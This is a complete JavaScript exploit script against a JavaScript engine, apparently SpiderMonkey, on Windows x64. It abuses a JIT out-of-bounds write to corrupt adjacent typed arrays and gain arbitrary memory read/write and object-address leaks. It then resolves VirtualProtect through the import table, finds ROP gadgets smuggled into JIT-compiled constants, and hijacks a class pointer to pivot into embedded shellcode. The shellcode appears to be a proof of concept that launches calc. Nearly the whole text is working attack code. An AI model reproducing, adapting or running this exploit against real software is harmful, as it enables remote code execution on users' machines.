oob_arr = [1, 2, 3, 4];
victim = new Array(0x20);
const Spray = [];

load('utils.js');
load('int64.js');

const Shellcode = new Uint8Array([
    0x90,
    0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x08, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0x64, 0x24, 0xe8,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xe8, 0x6a, 0x00, 0x8f, 0x45, 0xf0,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x08, 0x48, 0x8d, 0x55, 0xe8, 0xe8, 0x74,
    0x01, 0x00, 0x00, 0xe8, 0xd0, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x15,
    0x3e, 0x02, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x53, 0x56, 0x57, 0x41, 0x54,
    0x55, 0x48, 0x8b, 0xec, 0x6a, 0x60, 0x58, 0x65, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48,
    0x8b, 0x70, 0x10, 0x48, 0x8b, 0x46, 0x30, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x13, 0xeb, 0x08, 0x4c,
    0x8b, 0x06, 0x49, 0x8b, 0xf0, 0xeb, 0xec, 0x45, 0x33, 0xdb, 0x66, 0x45, 0x33, 0xd2, 0xeb, 0x09,
    0x33, 0xc0, 0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x66, 0x8b, 0x46, 0x58, 0x66, 0x44, 0x3b,
    0xd0, 0x72, 0x11, 0xeb, 0x3c, 0x66, 0x45, 0x8b, 0xc2, 0x66, 0x41, 0x83, 0xc0, 0x02, 0x66, 0x45,
    0x8b, 0xd0, 0xeb, 0xe5, 0x45, 0x8b, 0xcb, 0x41, 0xc1, 0xe9, 0x0d, 0x41, 0x8b, 0xc3, 0xc1, 0xe0,
    0x13, 0x44, 0x0b, 0xc8, 0x41, 0x8b, 0xc1, 0x4c, 0x8b, 0x46, 0x60, 0x45, 0x0f, 0xb7, 0xca, 0x4d,
    0x03, 0xc1, 0x45, 0x8a, 0x00, 0x45, 0x0f, 0xbe, 0xc0, 0x41, 0x83, 0xf8, 0x61, 0x72, 0x15, 0xeb,
    0x07, 0x41, 0x3b, 0xcb, 0x74, 0x16, 0xeb, 0x97, 0x41, 0x83, 0xe8, 0x20, 0x41, 0x03, 0xc0, 0x44,
    0x8b, 0xd8, 0xeb, 0xb1, 0x41, 0x03, 0xc0, 0x44, 0x8b, 0xd8, 0xeb, 0xa9, 0x4c, 0x8b, 0x56, 0x30,
    0x41, 0x8b, 0x42, 0x3c, 0x4d, 0x8b, 0xe2, 0x4c, 0x03, 0xe0, 0x41, 0x8b, 0x84, 0x24, 0x88, 0x00,
    0x00, 0x00, 0x4d, 0x8b, 0xca, 0x4c, 0x03, 0xc8, 0x45, 0x33, 0xdb, 0x41, 0x8b, 0x41, 0x18, 0x44,
    0x3b, 0xd8, 0x72, 0x0b, 0xe9, 0x56, 0xff, 0xff, 0xff, 0x41, 0x83, 0xc3, 0x01, 0xeb, 0xec, 0x41,
    0x8b, 0x41, 0x20, 0x49, 0x8b, 0xda, 0x48, 0x03, 0xd8, 0x45, 0x8b, 0xc3, 0x48, 0x8b, 0xc3, 0x4a,
    0x8d, 0x04, 0x80, 0x8b, 0x00, 0x49, 0x8b, 0xfa, 0x48, 0x03, 0xf8, 0x33, 0xc0, 0x48, 0x8b, 0xdf,
    0x48, 0x83, 0xc7, 0x01, 0x44, 0x8a, 0x03, 0x41, 0x0f, 0xbe, 0xd8, 0x83, 0xfb, 0x00, 0x74, 0x02,
    0xeb, 0x06, 0x3b, 0xd0, 0x74, 0x17, 0xeb, 0xc1, 0x44, 0x8b, 0xc0, 0x41, 0xc1, 0xe8, 0x0d, 0xc1,
    0xe0, 0x13, 0x44, 0x0b, 0xc0, 0x44, 0x03, 0xc3, 0x41, 0x8b, 0xc0, 0xeb, 0xd0, 0x41, 0x8b, 0x41,
    0x1c, 0x49, 0x8b, 0xd2, 0x48, 0x03, 0xd0, 0x41, 0x8b, 0x41, 0x24, 0x4d, 0x8b, 0xca, 0x4c, 0x03,
    0xc8, 0x45, 0x8b, 0xc3, 0x49, 0x8b, 0xc1, 0x4a, 0x8d, 0x04, 0x40, 0x66, 0x8b, 0x00, 0x0f, 0xb7,
    0xc8, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0x04, 0x88, 0x8b, 0x00, 0x4c, 0x03, 0xd0, 0x49, 0x8b, 0xc2,
    0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x53, 0x56, 0x57, 0x41, 0x54, 0x55, 0x48, 0x8b, 0xec,
    0x48, 0x8b, 0xf1, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0x03, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x0e, 0x48,
    0x8b, 0xc6, 0x48, 0x83, 0xc6, 0x04, 0x44, 0x8b, 0x20, 0x33, 0xff, 0xeb, 0x07, 0xc9, 0x41, 0x5c,
    0x5f, 0x5e, 0x5b, 0xc3, 0x8b, 0x06, 0x41, 0x8b, 0xcc, 0x8b, 0xd0, 0xe8, 0x6b, 0xfe, 0xff, 0xff,
    0x48, 0x8b, 0xd0, 0x48, 0x83, 0xfa, 0x00, 0x74, 0x02, 0xeb, 0x06, 0x48, 0x83, 0xc3, 0x08, 0xeb,
    0xc5, 0x48, 0x8b, 0x03, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc7, 0x01, 0x48, 0x8d, 0x04, 0xc8, 0x48,
    0x89, 0x10, 0x48, 0x83, 0xc6, 0x04, 0xeb, 0xcc, 0x57, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0xa4,
    0x24, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xbd, 0x78, 0xff, 0xff, 0xff, 0x32, 0xc0, 0x6a, 0x68,
    0x59, 0xf3, 0xaa, 0xc7, 0x85, 0x78, 0xff, 0xff, 0xff, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05,
    0x6e, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x10, 0x4c, 0x8d, 0x95, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d,
    0x45, 0xe0, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x45, 0x33, 0xc9, 0x50, 0x41, 0x52, 0x6a, 0x00, 0x6a,
    0x00, 0x6a, 0x00, 0x6a, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x05, 0x21, 0x00, 0x00,
    0x00, 0xff, 0x10, 0x48, 0x83, 0xc4, 0x50, 0xb9, 0x39, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24,
    0xe0, 0x48, 0x8d, 0x15, 0x0a, 0x00, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0xc9,
    0x5f, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x17, 0xca, 0x2b, 0x6e, 0x72, 0xfe, 0xb3, 0x16, 0x7e, 0xd8, 0xe2, 0x73, 0x00, 0x00,
    0x00, 0x00, 0x63, 0x61, 0x6c, 0x63, 0x00
]);

function FindImportDescriptor(ModuleBase, DllName2Find) {
    const ImgDosHeader_e_lfanew = Read32(BigInt(Add(ModuleBase, 0x3c)));
    const ImgNtHeaders64 = Add(ModuleBase, ImgDosHeader_e_lfanew);
    let ImportDescriptor = Add(ModuleBase, Read32(BigInt(
        Add(ImgNtHeaders64, 0x18 + 0x70 + (1 * 8)))
    ));

    let Found = false;
    while (true) {
        const NameRVA = Read32(BigInt(Add(ImportDescriptor, 3 * 4)));

        if (Eq(NameRVA, 0)) {
            break;
        }

        const NameAddress = Add(ModuleBase, NameRVA);
        const Name = ReadString(BigInt(NameAddress));
        print('[*] ImportDescriptor @ ' + ImportDescriptor.toString(16) + ': ' + NameAddress.toString(16) + ': ' + Name);
        if (Name.toLowerCase() == DllName2Find.toLowerCase()) {
            Found = true;
            break;
        }

        ImportDescriptor = Add(ImportDescriptor, 0x14);
    }

    if (!Found) {
        print('[-] Could not find the import descriptor for ' + DllName2Find);
        ImportDescriptor = null;
    }

    return ImportDescriptor;
}

function FindImportedAPIsFromImportDescriptor(ModuleBase, ImportDescriptor, ...APINames) {
    const Results = {};
    const ImportNames = Add(ModuleBase, Read32(BigInt(ImportDescriptor)));
    const ImportAddresses = Add(ModuleBase, Read32(BigInt(Add(ImportDescriptor, 4 * 4))));
    const APINamesLower = APINames.map(
        p => p.toLowerCase()
    );

    print('[*] Looking for ' + APINames.join(', ') + '..');
    print('[+]   Imports Name Array is @ ' + ImportNames);
    print('[+]   Imports Address Array is @ ' + ImportAddresses);

    let Idx = 0;
    while (true) {
        const ImportAddress = Read64(BigInt(Add(ImportAddresses, Idx * 8)));
        if (ImportAddress == 0n) {
            break;
        }

        ImportNameRVA = Read64(BigInt(ImportNames) + BigInt(Idx * 8));
        const ImportNameAddress = BigInt(ModuleBase) + BigInt(ImportNameRVA);
        const ImportNameAddressFixed = ImportNameAddress + 2n;
        const ImportName = ReadString(ImportNameAddressFixed);
        const ImportNameLower = ImportName.toLowerCase();
        print('[*]     Function: ' + ImportName + ' is @ ' + ImportAddress.toString(16));
        if (APINamesLower.includes(ImportNameLower)) {
            Results[ImportNameLower] = ImportAddress;
        }

        if (Object.keys(Results).length == APINamesLower.length) {
            break;
        }

        Idx++;
    }

    const Addresses = [];
    for (const APINameLower of APINamesLower) {
        const Address = Results.hasOwnProperty(APINameLower) ? Results[APINameLower] : null;
        Addresses.push(Address);
    }

    if (Addresses.length == 1) {
        return Addresses[0];
    }

    return Addresses;
}

function FindImportedAPIs(ModuleBase, DllName, ...APINames) {
    const ImportDescriptor = FindImportDescriptor(ModuleBase, DllName);
    if (ImportDescriptor == null) {
        const Nulls = APINames.map(_ => null);
        if (APINames.length == 1) {
            return Nulls[0];
        }
        return Nulls;
    }

    return FindImportedAPIsFromImportDescriptor(
        ModuleBase,
        ImportDescriptor,
        ...APINames
    );
}

function FindModuleBase(Address) {
    let Base = Address & 0xfffffffffffff000n;
    while (true) {
        const MZ = Array.from(ReadBytes(Base, 2)).map(c => String.fromCharCode(c)).join('');
        if (MZ == 'MZ') {
            break;
        }
        Base = Base - 0x1000n;
    }

    return Base;
}

function intToBytes2(value) {
    dst = new Uint8Array(4);
    dst[3] = ((value >> 24) & 0xFF);
    dst[2] = ((value >> 16) & 0xFF);
    dst[1] = ((value >> 8) & 0xFF);
    dst[0] = (value & 0xFF);
    return dst;
}

function ArrayCmp(A, B) {
    if (A.length != B.length) {
        return false;
    }

    for (let Idx = 0; Idx < A.length; Idx++) {
        if (A[Idx] != B[Idx]) {
            return false;
        }
    }

    return true;
}

oob_arr.__defineSetter__("-1", function (x) {
    victim.length = 0;
    for (let i = 0; i < 0x40000; i++) {
        Spray.push(new Uint32Array(0x5));
    }
});

function jitme(index, in2, in3) {
    victim[in2] = 4;
    oob_arr[index] = 2;
    victim[in2] = in3;
}

function get_me_biggie() {
    for (let Idx = 0; Idx < 10; Idx++) {
        for (i = 0; i < 0x40000; i++) {
            oob_arr.length = 4;
            jitme(5, 23, 0x42424242);
        }

        oob_arr.length = 4;
        jitme(-1, 23, 0x42424242);

        const Biggie = Spray.find(e => e.length == 0x42424242);
        if (Biggie != null) {
            return Biggie;
        }
    }

    return null;
}

const Biggie = get_me_biggie();
if (Biggie == null || Biggie.length != 0x42424242) {
    throw 'Failed'
}

let Biggie2AdjacentSizeIndex = null;
for (let Idx = 0; Idx < 0x100; Idx++) {
    if (Biggie[Idx] == 0xfffa0000 && Biggie[Idx + 1] == 00000005) {
        Biggie2AdjacentSizeIndex = Idx + 1;
        break;
    }
}

if (Biggie2AdjacentSizeIndex == null) {
    throw 'Failed to find an adjacent array'
}
else {
    print('find an adjacent array, Index: ' + Biggie2AdjacentSizeIndex);
}

Biggie[Biggie2AdjacentSizeIndex] = 0xbbccdd;
const AdjacentArray = Spray.find(e => e.length == 0xbbccdd);
if (AdjacentArray == null) {
    throw 'Failed to find the corrupted adjacent array';
}
else {
    print('find the corrupted adjacent array');
}

function Read64(Addr) {
    Biggie[Biggie2AdjacentSizeIndex] = 2;
    Biggie[Biggie2AdjacentSizeIndex + 4] = Number(Addr & 0xffffffffn);
    Biggie[Biggie2AdjacentSizeIndex + 5] = Number(Addr >> 32n);
    return BigInt(AdjacentArray[1]) << 32n | BigInt(AdjacentArray[0]);
}

function Read64int(Addr) {
    Biggie[Biggie2AdjacentSizeIndex] = 2;
    Biggie[Biggie2AdjacentSizeIndex + 4] = Number(Addr & 0xffffffffn);
    Biggie[Biggie2AdjacentSizeIndex + 5] = Number(Addr >> 32n);
    return Int64(AdjacentArray[1]) << 32 | Int64(AdjacentArray[0]);
}

function Write64(Addr, Value) {
    Biggie[Biggie2AdjacentSizeIndex] = 2;
    Biggie[Biggie2AdjacentSizeIndex + 4] = Number(Addr & 0xffffffffn);
    Biggie[Biggie2AdjacentSizeIndex + 5] = Number(Addr >> 32n);
    AdjacentArray[0] = Number(Value & 0xffffffffn);
    AdjacentArray[1] = Number(Value >> 32n);
}

function AddrOf(Obj) {
    AdjacentArray.x = Obj;
    return Read64(BigInt(Biggie[Biggie2AdjacentSizeIndex - 5]) << 32n | BigInt(Biggie[Biggie2AdjacentSizeIndex - 6])) & 0x0000ffffffffffffn;
}

function ReadBytes(Addr, Length) {
    view = new Uint8Array(Length);
    Biggie[Biggie2AdjacentSizeIndex] = Length / 4 + 1;
    Biggie[Biggie2AdjacentSizeIndex + 4] = Number(Addr & 0xffffffffn);
    Biggie[Biggie2AdjacentSizeIndex + 5] = Number(Addr >> 32n);

    for (i = 0; i < Length / 4; i++) {
        temp = intToBytes2(AdjacentArray[i]);
        view[i * 4] = temp[0];
        view[i * 4 + 1] = temp[1];
        view[i * 4 + 2] = temp[2];
        view[i * 4 + 3] = temp[3];
    }
    return view.slice(0, Length);
}

function Read32(Addr) {
    Biggie[Biggie2AdjacentSizeIndex] = 2;
    Biggie[Biggie2AdjacentSizeIndex + 4] = Number(Addr & 0xffffffffn);
    Biggie[Biggie2AdjacentSizeIndex + 5] = Number(Addr >> 32n);
    return AdjacentArray[0];
}

function ReadString(Addr) {
    let S = '';
    while (true) {
        let Char = ReadBytes(Addr, 1)[0];
        if (Char == 0) {
            break;
        }

        S += String.fromCharCode(Char);
        Addr = Addr + 1n;
    }
    return S;
}

const EmptyElementsHeaders = BigInt(Biggie[Biggie2AdjacentSizeIndex - 3]) << 32n | BigInt(Biggie[Biggie2AdjacentSizeIndex - 4]);

const JSBase = FindModuleBase(EmptyElementsHeaders);
print('JSBase: ' + JSBase.toString(16));

const VirtualProtect = FindImportedAPIs(Number(JSBase), 'kernel32.dll', 'VirtualProtect');
print('kernel32!VirtualProtect: ' + VirtualProtect.toString(16));

const ShellcodeAddress = Read64(AddrOf(Shellcode) + 56n);
print('Shellcode: ' + ShellcodeAddress.toString(16));

const Magic = '0vercl0k'.split('').map(c => c.charCodeAt(0));
const BringYourOwnGadgets = function () {
    const Magic = 2.1091131882779924e+208;
    const PopRegisters = -6.380930795567661e-228;
    const Pivot0 = 2.4879826032820723e-275;
    const Pivot1 = 2.487982018260472e-275;
    const Pivot2 = -6.910095487116115e-229;
}

for (let Idx = 0; Idx < 12; Idx++) {
    BringYourOwnGadgets();
}

const BringYourOwnGadgetsAddress = AddrOf(BringYourOwnGadgets);
const JsScriptAddress = Read64(BringYourOwnGadgetsAddress + 0x30n);
const JittedAddress = Read64(JsScriptAddress);
print('JittedAddress: ' + JittedAddress.toString(16));

let JitPageStart = JittedAddress & 0xfffffffffffff000n;
let MagicAddress = 0;
let FoundMagic = false;
for (let PageIdx = 0; PageIdx < 3 && !FoundMagic; PageIdx++) {
    const JitPageContent = ReadBytes(JitPageStart, 0x1000);
    print('[+] Scanning JIT page @ ' + JitPageStart.toString(16));

    for (let ContentIdx = 0; ContentIdx < JitPageContent.byteLength; ContentIdx++) {
        const Needle = JitPageContent.subarray(ContentIdx, ContentIdx + Magic.length);
        if (ArrayCmp(Needle, Magic)) {
            MagicAddress = Add(Number(JitPageStart), ContentIdx);
            FoundMagic = true;
            break;
        }
    }

    JitPageStart = JitPageStart + 0x1000n;
}
print('magic is at: ' + MagicAddress.toString(16));
const PopRcxRdxR8R9Address = Add(MagicAddress, 0x8 + 4 + 2);
const RetAddress = Add(PopRcxRdxR8R9Address, 6);
const PivotAddress = Add(PopRcxRdxR8R9Address, 0x8 + 4 + 2);
print('PopRcxRdxR8R9 is @ ' + PopRcxRdxR8R9Address.toString(16));
print('Pivot is @ ' + PivotAddress.toString(16));
print('Ret is @ ' + RetAddress.toString(16));

const TargetBuffer = new Uint8Array(0x10000);
const TargetBufferAddress = Read64(AddrOf(TargetBuffer) + 56n);
let Offset2RopChain = 0x10000 / 2;
for (let Idx = 0; Idx < 0x10000; Idx += 8) {
    TargetBuffer.set(RetAddress.bytes(), Idx);
}

const PAGE_EXECUTE_READWRITE = new Int64(0x40);
const ShellcodeAddressInt = Number(ShellcodeAddress);
const TargetBufferAddressInt = Number(TargetBufferAddress);
const VirtualProtectAddressInt = Number(VirtualProtect);
const RopChain = [
    // pop rcx / pop rdx / pop r8 / pop r9 / ret
    PopRcxRdxR8R9Address,
    new Int64(ShellcodeAddressInt),
    new Int64(Shellcode.length),
    PAGE_EXECUTE_READWRITE,
    new Int64(TargetBufferAddressInt),

    new Int64(VirtualProtectAddressInt),
    new Int64(ShellcodeAddressInt),
];

for (const Entry of RopChain) {
    TargetBuffer.set(Entry.bytes(), Offset2RopChain);
    Offset2RopChain += 8;
}

const TargetAddress = AddrOf(TargetBuffer);
const TargetGroup_ = Read64(TargetAddress);
const TargetClasp_ = Read64(TargetGroup_);
const TargetcOps = Read64(TargetClasp_ + 0x10n);
const TargetClasp_Address = TargetGroup_;

const TargetShapeOrExpando_ = Read64(TargetAddress + 0x8n);
const TargetBase_ = Read64(TargetShapeOrExpando_);
const TargetBaseClasp_Address = TargetBase_;


const MemoryBackingObject = new Uint8Array(0x88);
const MemoryBackingObjectAddress = AddrOf(MemoryBackingObject);
const ClassMemoryBackingAddress = Read64(MemoryBackingObjectAddress + 56n);
const ClassOpsMemoryBackingAddress = ClassMemoryBackingAddress + 0x30n;
const ClassOpsMemoryBackingAddressInt = Number(ClassOpsMemoryBackingAddress);

MemoryBackingObject.set(ReadBytes(TargetClasp_, 0x30), 0);
MemoryBackingObject.set(new Int64(ClassOpsMemoryBackingAddressInt).bytes(), 0x10);

MemoryBackingObject.set(ReadBytes(TargetcOps, 0x50), 0x30);
MemoryBackingObject.set(PivotAddress.bytes(), 0x30);

Write64(TargetClasp_Address, ClassMemoryBackingAddress);
Write64(TargetBaseClasp_Address, ClassMemoryBackingAddress);

TargetBuffer.im_falling_and_i_cant_turn_back = 1;
